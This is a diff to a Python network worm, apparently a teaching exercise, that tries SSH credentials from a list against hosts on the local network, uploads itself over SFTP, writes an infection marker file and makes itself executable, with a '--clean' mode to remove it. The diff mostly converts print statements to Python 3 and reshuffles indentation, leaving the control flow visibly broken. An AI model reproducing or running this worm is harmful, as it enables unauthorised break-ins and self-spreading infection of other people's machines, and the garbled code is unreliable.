@@ -20,7 +20,7 @@ credList = [
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
-
+LOCAL_PATH = "/tmp"
 WORM_FILE = "/tmp/worm.py"
 
 ##################################################################
@@ -65,13 +65,15 @@ def spreadAndExecute(sshClient):
 	# is very similar to that code.	
 
 	sftp = sshClient.open_sftp()
- 	sftp.put("/tmp/worm.py", "/tmp/worm.py")
+
+	sftp.put("/tmp/worm.py", "/tmp/worm.py")
 
 	if not isInfectedSystem():
 		sftpfile = sftp.file(INFECTED_MARKER_FILE,'w')
 		sftpfile.write("You are infected with worms!")
 		sftpfile.close()	
-  	else:
+  	
+	else:
 		sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)
 
 		sshClient.exec_command("chmod a+x /tmp/worm.py")
@@ -157,12 +159,12 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		attemptResults = tryCredentials(host, username, password, ssh)
-        if attemptResults == 0:
+		if attemptResults == 0:
 			return (ssh, username, password)
 		if attemptResults == 3:
-			print "Server Down."
+			print ("Server Down.")
 		if attemptResults == 1:
-			print "Incorrect input."
+			print ("Incorrect input.")
 			
 	# Could not find working credentials
 	return None	
@@ -205,27 +207,36 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-    if len(sys.argv) < 2: and not(sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
+def cleaner(sshClient): 
+	
+	# remove the infection (i.e. marker file) from the host
+	# remove the worm program from the host
+	sftp = sshClient.open_sftp()
+	sftp.remove(LOCAL_PATH + "/worm.py")
+	sftp.remove(INFECTED_MARKER_FILE)
+
+
+	if len(sys.argv) < 2:
 	
 # TODO: If we are running on the victim, check if 
 # the victim was already infected. If so, terminate.
 # Otherwise, proceed with malice. 
-	if isInfectedSystem():
-		exit
+		if isInfectedSystem():
+			exit
 
 # TODO: Get the IP of the current system
-    currentIPs = getMyIP()
+currentIPs = getMyIP()
 
 
 # Get the hosts on the same network
-    networkHosts = getHostsOnTheSameNetwork()
+networkHosts = getHostsOnTheSameNetwork()
 
 # TODO: Remove the IP of the current system
 # from the list of discovered systems (we
 # do not want to target ourselves!).
-    for ip in currentIPs:
-        networkHosts.remove(currentIP)
-        print "Found hosts: ", networkHosts
+for ip in currentIPs:
+    networkHosts.remove(currentIPs)
+    print ("Found hosts: "), networkHosts
 
 
 # Go through the network hosts
@@ -234,13 +245,13 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
-	print sshInfo
+	print (sshInfo)
 	
 	
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread" + sshInfo
+		print ("Trying to spread") + sshInfo
 		
 		# TODO: Check if the system was	
 		# already infected. This can be
@@ -273,40 +284,43 @@ for host in networkHosts:
 		sftp = sshInfo.open_sftp()
 		try:
 			sftp.stat(INFECTED_MARKER_FILE)
-			print host + " is infected."
+			print (host + (" is infected."))
 			sftp.close()
 
 			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
-				print "Cleaning " + host
-				cleaner(sshInfo)
-				print ' ' +  host + ' successfully cleaned.'
+				print ("Cleaning ") + host
+				cleaner (sshInfo)
+				print ((" ") +  host + (" successfully cleaned."))
 			
 			sshInfo.close()
 
 		except IOError:
 			
-            sftp.close()
+        		sftp.close() 
 
-			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
-				print host + " not infected, leaving alone"
-			else:
-				print "Attempting to spread..."
+if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
 				
-                spreadAndExecute(sshInfo[0])
+	print (host + " not infected, leaving alone")
+
+else:
+	print ("Attempting to spread...")
 				
-                print "Spreading complete."	
-	
-        else:
-		    print "No sshInfo"		
-  
+	spreadAndExecute(sshInfo[0])
+				
+	print ("Successfully Spread.")		
 
 #Cleaning
 if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
 	if isInfectedSystem():
 		os.remove(INFECTED_MARKER_FILE)
-	print "Cleaning Completed!"
+	print ("Cleaning Completed!")
 else:
-	print "Spreading Completed!"
+	print ("Spreading Completed!")
+	
+	
+
+
+
 	
 	
 
